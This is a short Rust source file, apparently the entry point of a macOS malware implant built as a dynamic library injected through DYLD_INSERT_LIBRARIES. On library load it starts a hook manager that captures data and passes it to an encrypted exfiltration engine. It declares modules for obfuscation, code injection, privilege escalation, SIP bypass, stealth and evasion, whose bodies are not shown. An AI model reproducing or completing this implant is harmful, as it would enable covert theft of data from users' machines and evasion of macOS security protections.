// macOS Dynamic Library Entry Point
#[cfg(target_os = "macos")]
#[no_mangle]
pub extern "C" fn _init() {
    // Initialize on library load (DYLD_INSERT_LIBRARIES)
    std::thread::spawn(|| {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(init_seed());
    });
}

async fn init_seed() {
    use std::sync::Arc;
    use tokio::sync::mpsc;
    
    let hook_manager = Arc::new(hook::HookManager::new());
    let crypto_manager = Arc::new(crypto::CryptoManager::new());
    
    let (data_tx, data_rx) = mpsc::unbounded_channel();
    
    let hook_mgr = hook_manager.clone();
    tokio::spawn(async move {
        hook_mgr.start_capture(data_tx).await;
    });
    
    let exfil_engine = exfil::ExfiltrationEngine::new(crypto_manager, data_rx);
    exfil_engine.start().await;
}

mod hook;
mod exfil;
mod crypto;
mod buffer;
mod obfuscate;
mod injection;
mod privilege_escalation;
mod sip_bypass;
mod stealth;
mod advanced_evasion;
mod proto;

pub use hook::HookManager;
pub use exfil::ExfiltrationEngine;
pub use crypto::CryptoManager;

